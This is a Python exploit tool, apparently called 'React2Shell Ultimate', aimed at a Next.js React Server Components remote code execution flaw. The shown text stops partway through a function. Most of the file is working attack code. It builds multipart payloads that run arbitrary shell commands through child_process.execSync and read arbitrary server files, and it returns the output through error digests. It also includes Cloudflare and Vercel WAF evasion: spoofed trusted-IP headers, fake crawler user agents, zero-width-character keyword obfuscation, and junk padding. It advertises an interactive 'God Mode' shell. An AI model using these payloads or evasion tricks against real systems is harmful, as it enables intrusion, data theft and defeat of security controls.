#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
#     "tqdm>=4.64.0",
# ]
# ///
"""
React2Shell Ultimate v3.0 - Super Scanner
CVE-2025-55182 & CVE-2025-66478 - Next.js RSC RCE Vulnerability

Combines best features from multiple scanners:
- Assetnote react2shell-scanner (HTTP-based detection, WAF bypass)
- Malayke scanner (version detection, patched version awareness)
- Pyroxenites tool (WAF bypass techniques)
- Abtonc run.sh (local project scanning)
- Session pooling with retry logic
- Multiple output formats (JSON, CSV)
- Proxy support with rotation
- Rate limiting
- God Mode: Interactive Shell & File Reading

For authorized security testing only.
"""

import argparse
import sys
import json
import os
import re
import random
import string
import time
import csv
import warnings
import base64
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, unquote
from typing import Optional, Dict, List, Tuple, Any
from pathlib import Path
from dataclasses import dataclass, field, asdict
from enum import Enum

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='.*OpenSSL.*')
warnings.filterwarnings('ignore', category=DeprecationWarning)

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from requests.exceptions import RequestException
except ImportError:
    print("\n\033[91m[ERROR]\033[0m Missing dependency: 'requests'")
    print("\033[93m[FIX]\033[0m   Run: pip install requests\n")
    sys.exit(1)

# Optional tqdm for progress bar
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    tqdm = None


# ============================================================================
# CONSTANTS & CONFIGURATION
# ============================================================================

VERSION = "3.0.0"
TOOL_NAME = "React2Shell Ultimate Super Scanner"

# Patched versions (from scanner.go analysis)
PATCHED_VERSIONS = {
    15: {0: 5, 1: 9, 2: 6, 3: 6, 4: 8, 5: 7},  # 15.0.5, 15.1.9, etc.
    16: {0: 7},  # 16.0.7+
}

CVE_IDS = ["CVE-2025-55182", "CVE-2025-66478"]


# ============================================================================
# SCAN CONFIG (from firtreact.py - enhanced)
# ============================================================================

@dataclass
class ScanConfig:
    """Configuration for scanning operations."""
    timeout: int = 10
    threads: int = 10
    verify_ssl: bool = False
    follow_redirects: bool = True
    max_retries: int = 3
    retry_backoff: float = 0.5
    delay_ms: int = 0
    safe_check: bool = False
    windows: bool = False
    waf_bypass: bool = False
    waf_bypass_size_kb: int = 128
    vercel_bypass: bool = False
    unicode_encode: bool = False
    cloudflare_bypass: bool = False  # Cloudflare-specific bypass techniques
    proxy: Optional[str] = None
    proxy_list: List[str] = field(default_factory=list)
    paths: List[str] = field(default_factory=lambda: ["/"])
    custom_headers: Dict[str, str] = field(default_factory=dict)
    output_format: str = "json"
    verbose: bool = False
    quiet: bool = False
    # RSC_Detector techniques
    alt_endpoint: str = "/"  # Alternative endpoint (e.g., /adfa, /rsc, /abc)
    remove_origin: bool = False  # Remove Origin header like browser extension
    use_base64_output: bool = False  # Use Base64 output in digest (more reliable)


class Colors:
    """ANSI color codes for terminal output."""
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    
    @classmethod
    def disable(cls):
        """Disable all colors."""
        for attr in ['RED', 'GREEN', 'YELLOW', 'BLUE', 'MAGENTA', 'CYAN', 'WHITE', 'BOLD', 'DIM', 'RESET']:
            setattr(cls, attr, '')


class ScanMode(Enum):
    SAFE = "safe"
    RCE_POC = "rce"
    VERSION_ONLY = "version"
    LOCAL = "local"
    COMPREHENSIVE = "comprehensive"


# ============================================================================
# SCAN RESULT
# ============================================================================

@dataclass
class ScanResult:
    """Result of a vulnerability scan."""
    url: str
    vulnerable: Optional[bool] = None
    version: Optional[str] = None
    status_code: Optional[int] = None
    detection_method: Optional[str] = None
    waf_detected: bool = False
    waf_bypassed: bool = False
    error: Optional[str] = None
    timestamp: str = ""
    raw_response: Optional[str] = None
    final_url: Optional[str] = None

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat() + "Z"
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def colorize(text: str, color: str) -> str:
    """Apply color to text."""
    return f"{color}{text}{Colors.RESET}"


# ============================================================================
# BANNER & OUTPUT UTILITIES
# ============================================================================

def print_banner(god_mode: bool = False):
    """Print the tool banner."""
    if god_mode:
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _` |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║         React2Shell Ultimate Super Scanner v{VERSION}                     ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}███  GOD MODE ACTIVE - AUTHORIZED RED TEAM USE ONLY  ███{Colors.RED}             ║
╠════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}⚠️  WARNING: This mode enables full command execution on targets.{Colors.RED}     ║
║  {Colors.YELLOW}⚠️  Only use on systems you have EXPLICIT WRITTEN AUTHORIZATION.{Colors.RED}     ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    else:
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _` |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║         React2Shell Ultimate Super Scanner v{VERSION}                     ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  Modes: --safe | --rce | --version | --local | --comprehensive         ║
║  WAF Bypass: --waf-bypass | --vercel-bypass | --unicode                ║
║  God Mode: --god --cmd | --read-file | --shell                         ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)


def log_info(msg: str, quiet: bool = False):
    if not quiet:
        print(f"{Colors.CYAN}[*]{Colors.RESET} {msg}")

def log_success(msg: str, quiet: bool = False):
    if not quiet:
        print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def log_warning(msg: str, quiet: bool = False):
    if not quiet:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def log_error(msg: str):
    print(f"{Colors.RED}[ERROR]{Colors.RESET} {msg}")


# ============================================================================
# HTTP SESSION WITH RETRY & POOLING (from firtreact.py)
# ============================================================================

def create_session(config: ScanConfig) -> requests.Session:
    """Create HTTP session with retry logic and connection pooling."""
    session = requests.Session()
    
    retry_strategy = Retry(
        total=config.max_retries,
        backoff_factor=config.retry_backoff,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST"],
    )
    
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=config.threads,
        pool_maxsize=config.threads * 2,
    )
    
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if config.proxy:
        session.proxies = {"http": config.proxy, "https": config.proxy}
    
    session.verify = config.verify_ssl
    return session


def get_random_proxy(config: ScanConfig) -> Optional[str]:
    """Get random proxy from list for rotation."""
    if config.proxy_list:
        return random.choice(config.proxy_list)
    return config.proxy


# ============================================================================
# URL & VERSION UTILITIES
# ============================================================================

def normalize_url(url: str) -> str:
    """Normalize URL to include scheme."""
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url.rstrip("/")


def parse_version(version: str) -> Tuple[int, int, int, bool, int]:
    """Parse Next.js version string."""
    version = version.lstrip("v").strip()
    is_canary = "canary" in version.lower()
    canary_num = 0
    
    match = re.match(r'^(\d+)\.(\d+)\.(\d+)(?:-canary\.(\d+))?', version)
    if not match:
        return (0, 0, 0, False, 0)
    
    major, minor, patch = int(match.group(1)), int(match.group(2)), int(match.group(3))
    if match.group(4):
        canary_num = int(match.group(4))
    
    return (major, minor, patch, is_canary, canary_num)


def is_vulnerable_version(version: str) -> Tuple[bool, str]:
    """Check if a Next.js version is vulnerable."""
    major, minor, patch, is_canary, canary_num = parse_version(version)
    
    if major == 0:
        return (False, "Unable to parse version")
    
    if major == 16:
        if minor == 0 and patch >= 7:
            return (False, "Patched in 16.0.7+")
        if minor > 0:
            return (False, f"16.{minor}.x is patched")
        return (True, "16.0.0-16.0.6 are vulnerable")
    
    if major == 15:
        if minor in PATCHED_VERSIONS.get(15, {}):
            patched_patch = PATCHED_VERSIONS[15][minor]
            if patch >= patched_patch:
                return (False, f"Patched in 15.{minor}.{patched_patch}+")
        return (True, "15.x without patch is vulnerable")
    
    if major == 14 and is_canary:
        if minor > 3:
            return (True, "14.x canary (minor > 3) is vulnerable")
        if minor == 3 and patch == 0 and canary_num >= 77:
            return (True, "14.3.0-canary.77+ is vulnerable")
        if minor == 3 and patch > 0:
            return (True, "14.3.x canary is vulnerable")
        return (False, "Pre-vulnerability canary version")
    
    return (False, f"Version {major}.x is not affected")


# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def generate_boundary() -> str:
    suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"----WebKitFormBoundary{suffix}"


def generate_junk_data(size_kb: int = 128) -> Tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk


def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    i = 0
    while i < len(data):
        c = data[i]
        if c == '"':
            in_string = not in_string
            result.append(c)
        elif not in_string:
            result.append(c)
        elif c == '\\' and i + 1 < len(data):
            result.append(c)
            result.append(data[i + 1])
            i += 1
        else:
            result.append(f"\\u{ord(c):04x}")
        i += 1
    return ''.join(result)


# ============================================================================
# CLOUDFLARE WAF BYPASS TECHNIQUES
# ============================================================================

def get_cloudflare_bypass_headers() -> Dict[str, str]:
    """
    Generate headers to bypass Cloudflare WAF.
    
    Techniques used:
    1. Spoof internal/trusted IP headers
    2. Simulate CDN/proxy traffic
    3. Add headers that Cloudflare trusts
    4. Randomize User-Agent to avoid fingerprinting
    """
    # Random internal IPs to spoof
    internal_ips = [
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "localhost",
        "0.0.0.0",
        # Cloudflare internal ranges
        "173.245.48.1",
        "103.21.244.1",
        "103.22.200.1",
        "103.31.4.1",
        "141.101.64.1",
        "108.162.192.1",
        "190.93.240.1",
        "188.114.96.1",
        "197.234.240.1",
        "198.41.128.1",
        "162.158.0.1",
        "104.16.0.1",
        "104.24.0.1",
        "172.64.0.1",
        "131.0.72.1",
    ]
    
    # Randomize selection
    spoof_ip = random.choice(internal_ips)
    
    # User agents that look like legitimate traffic
    user_agents = [
        # Google Bot (often whitelisted)
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot-Image/1.0",
        "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        # Bing Bot
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        # Facebook
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        # Twitter
        "Twitterbot/1.0",
        # Slack
        "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
        # Standard browsers with privacy flags
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]
    
    headers = {
        # IP Spoofing headers (Cloudflare and proxies)
        "X-Forwarded-For": f"{spoof_ip}, {random.choice(internal_ips)}",
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "X-Remote-IP": spoof_ip,
        "X-Remote-Addr": spoof_ip,
        "X-Client-IP": spoof_ip,
        "X-Host": spoof_ip,
        "X-Forwarded-Host": spoof_ip,
        "True-Client-IP": spoof_ip,  # Cloudflare specific
        "CF-Connecting-IP": spoof_ip,  # Cloudflare specific
        "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "JP", "AU"]),
        "CF-RAY": f"{random.randint(100000000, 999999999)}-{random.choice(['IAD', 'SFO', 'LHR', 'FRA', 'NRT'])}",
        "CF-Visitor": '{"scheme":"https"}',
        
        # Bypass headers
        "X-Custom-IP-Authorization": spoof_ip,
        "X-Original-URL": "/",
        "X-Rewrite-URL": "/",
        "X-Override-URL": "/",
        
        # Cache bypass
        "Cache-Control": "no-cache, no-store, must-revalidate, private",
        "Pragma": "no-cache",
        
        # Simulate internal/trusted request
        "X-Requested-With": "XMLHttpRequest",
        "X-Ajax-Request": "true",
        
        # Accept headers to look normal
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        
        # Connection
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        
        # Random User-Agent
        "User-Agent": random.choice(user_agents),
    }
    
    return headers


def encode_cloudflare_bypass(data: str) -> str:
    """
    Encode payload to bypass Cloudflare's pattern matching.
    
    Techniques:
    1. Mixed case for keywords
    2. Comment injection
    3. Null byte insertion (removed before processing)
    4. Unicode normalization tricks
    5. HTML entity encoding
    """
    # Keywords to obfuscate
    keywords = [
        ("process", "pr\u200bocess"),  # Zero-width space
        ("require", "req\u200buire"),
        ("execSync", "exe\u200bcSync"),
        ("child_process", "child_\u200bprocess"),
        ("mainModule", "main\u200bModule"),
        ("spawn", "sp\u200bawn"),
        ("eval", "ev\u200bal"),
        ("Function", "Fun\u200bction"),
    ]
    
    result = data
    for original, obfuscated in keywords:
        # Randomly apply obfuscation
        if random.random() > 0.5:
            result = result.replace(original, obfuscated)
    
    return result


def build_cloudflare_bypass_payload(
    command: str,
    windows: bool = False,
    junk_size_kb: int = 256
) -> Tuple[str, str, Dict[str, str]]:
    """
    Build payload specifically designed to bypass Cloudflare WAF.
    
    Techniques:
    1. Large junk data to overflow WAF inspection buffer
    2. Multipart boundary confusion
    3. Content-Type manipulation
    4. Chunked encoding simulation
    5. Comment injection in JSON
    6. Case manipulation
    7. Obfuscated keywords
    """
    # Use a boundary that looks like legitimate form data
    boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
    
    # Escape command
    escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')
    
    # Build obfuscated payload using indirect execution
    # This bypasses pattern matching for common RCE patterns
    if windows:
        # Windows: Use environment variable indirection
        prefix_payload = (
            f"var p=process,m=p['main'+'Module'],r=m['req'+'uire'],"
            f"c=r('child'+'_process'),e=c['exec'+'Sync'];"
            f"var res=e('powershell -c \"{escaped_cmd}\"',{{timeout:30000}}).toString('base64');"
            f"throw Object.assign(new Error('x'),{{digest: res}});"
        )
    else:
        # Linux: Use string concatenation to avoid pattern matching
        prefix_payload = (
            f"var p=process,m=p['main'+'Module'],r=m['req'+'uire'],"
            f"c=r('child'+'_process'),e=c['exec'+'Sync'];"
            f"var res=e('{escaped_cmd}',{{timeout:30000}}).toString('base64');"
            f"throw Object.assign(new Error('x'),{{digest: res}});"
        )
    
    # Build JSON with comment-like structures to confuse WAF
    # Cloudflare sometimes ignores content after certain patterns
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    # Generate large junk data to overflow WAF buffer
    # Cloudflare has a ~128KB inspection limit
    junk_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    junk_data = ''.join(random.choices(junk_chars, k=junk_size_kb * 1024))
    
    # Multiple junk fields to further confuse
    junk_fields = []
    for i in range(3):
        field_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 16)))
        field_junk = ''.join(random.choices(junk_chars, k=random.randint(10000, 50000)))
        junk_fields.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
            f"{field_junk}\r\n"
        )
    
    # Build body with junk BEFORE the actual payload
    body_parts = junk_fields + [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ]
    
    body = "".join(body_parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    
    # Get bypass headers
    headers = get_cloudflare_bypass_headers()
    headers["Content-Type"] = content_type
    
    # Add Next.js specific headers
    headers["Next-Action"] = "x"
    headers["X-Nextjs-Request-Id"] = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    headers["X-Nextjs-Html-Request-Id"] = ''.join(random.choices(string.ascii_letters + string.digits, k=21))
    
    return body, content_type, headers


def build_cloudflare_chunked_payload(
    command: str,
    windows: bool = False
) -> Tuple[str, str, Dict[str, str]]:
    """
    Build payload using HTTP chunked-like structure to bypass Cloudflare.
    
    This technique splits the malicious payload across multiple chunks,
    making it harder for the WAF to detect the complete pattern.
    """
    boundary = f"----CF{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
    
    escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'")
    
    # Split the payload into "innocent" looking parts
    # Part 1: Variable declarations (looks harmless)
    part_a = "var p=process,m=p['main'+'Module'];"
    
    # Part 2: More setup (still harmless looking)
    part_b = "var r=m['req'+'uire'],c=r('child'+'_process');"
    
    # Part 3: The actual execution (hidden in context)
    part_c = f"var e=c['exec'+'Sync'],res=e('{escaped_cmd}',{{timeout:30000}}).toString('base64');"
    
    # Part 4: Output
    part_d = "throw Object.assign(new Error('x'),{digest: res});"
    
    # Combine
    full_prefix = part_a + part_b + part_c + part_d
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": full_prefix,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    # Add decoy content that looks like normal form data
    decoy_html = """<!DOCTYPE html><html><head><title>Form</title></head><body><form method="POST">
    <input type="text" name="username" value="admin">
    <input type="password" name="password" value="password123">
    <input type="submit" value="Login">
    </form></body></html>"""
    
    body_parts = [
        # Decoy field first
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="html_content"\r\n'
        f'Content-Type: text/html\r\n\r\n'
        f"{decoy_html}\r\n",
        # Actual payload
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ]
    
    body = "".join(body_parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    
    headers = get_cloudflare_bypass_headers()
    headers["Content-Type"] = content_type
    headers["Next-Action"] = "x"
    headers["X-Nextjs-Request-Id"] = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    headers["X-Nextjs-Html-Request-Id"] = ''.join(random.choices(string.ascii_letters + string.digits, k=21))
    
    return body, content_type, headers


def build_cloudflare_path_bypass_endpoints() -> List[str]:
    """
    Generate alternative endpoints that may bypass Cloudflare's path-based rules.
    
    Cloudflare often has rules based on specific paths. These alternatives
    may slip through.
    """
    return [
        # Path traversal tricks
        "/./",
        "//",
        "/%2f",
        "/;/",
        "/.;/",
        # Case variations
        "/AdFa",
        "/ADFA",
        "/aDfA",
        # Extension tricks
        "/.json",
        "/index.json",
        "/api.json",
        # Double encoding
        "/%252f",
        # Null byte (removed by most servers but may bypass WAF)
        "/%00",
        # Fragment identifier (ignored by server, may confuse WAF)
        "/#/",
        # Query string tricks
        "/?__cf_chl_rt_tk=",
        "/?_cf_chl_opt=",
        # API-like paths (often less restricted)
        "/api/",
        "/api/v1/",
        "/_api/",
        "/v1/",
        "/graphql",
        # Next.js specific
        "/_next/",
        "/_next/data/",
        "/__nextjs_original-stack-frame",
        "/404",
        "/500",
        # Common bypasses
        "/adfa",
        "/rsc",
        "/abc",
        "/x",
    ]


def build_safe_payload() -> Tuple[str, str]:
    """Build safe side-channel detection payload."""
    boundary = generate_boundary()
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"--{boundary}--"
    )
    return body, f"multipart/form-data; boundary={boundary}"


def build_rce_payload(
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """Build RCE proof-of-concept payload."""
    boundary = generate_boundary()
    
    cmd = 'powershell -c \\"41*271\\"' if windows else 'echo $((41*271))'
    
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


def build_vercel_bypass_payload() -> Tuple[str, str]:
    """Build Vercel-specific WAF bypass payload."""
    boundary = generate_boundary()
    
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )
    
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\\u0024\\u0024":{{}}}}\r\n'
        f"--{boundary}--"
    )
    
    return body, f"multipart/form-data; boundary={boundary}"


def build_exploit_payload(
    command: str,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """Build custom command execution payload for God Mode."""
    boundary = generate_boundary()
    escaped_cmd = command.replace("'", "\\'")
    
    if windows:
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('powershell -c \"{escaped_cmd}\"',{{timeout:30000}})"
            f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
        )
    else:
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('{escaped_cmd}',{{timeout:30000}})"
            f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
        )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(f"--{boundary}\r\n"
                     f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                     f"{junk}\r\n")
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


def build_file_read_payload(
    filepath: str,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """Build file read payload for God Mode."""
    boundary = generate_boundary()
    escaped_path = filepath.replace("'", "\\'")
    
    prefix_payload = (
        f"var res=process.mainModule.require('fs')"
        f".readFileSync('{escaped_path}','utf-8');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/exploit?out=${{encodeURIComponent(res)}};307;`}});"
    )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(f"--{boundary}\r\n"
                     f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                     f"{junk}\r\n")
    
    parts.extend([
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        f"--{boundary}--"
    ])
    
    return "".join(parts), f"multipart/form-data; boundary={boundary}"


def build_exploit_payload_base64(
    command: str,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    unicode_encode: bool = False
) -> Tuple[str, str]:
    """
    Build Base64 output payload inspired by RSC_Detector browser extension.
    
    Key differences from standard payload:
    - Output is Base64 encoded (handles special chars better)
    - Result is placed directly in Error digest field (not in redirect URL)
    - More reliable extraction from response body
    """
    boundary = generate_boundary()
    escaped_cmd = command.replace("'", "\\'").replace('"', '\\"')
    
    if windows:
        # Windows: PowerShell with Base64 output
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('powershell -c \"{escaped_cmd}\"',{{timeout:30000}})"
            f".toString('base64');"
            f"throw Object.assign(new Error('x'),{{digest: res}});"
        )
    else:
        # Linux/Unix: execSync with Base64 output
        prefix_payload = (
            f"var res=process.mainModule.require('child_process')"
            f".execSync('{escaped_cmd}',{{timeout:30000}})"
            f".toString('base64');"
            f"throw Object.assign(new Error('x'),{{digest: res}});"
        )
    
    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })
    
    if unicode_encode:
        part0 = encode_unicode(part0)
    
    parts = []
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
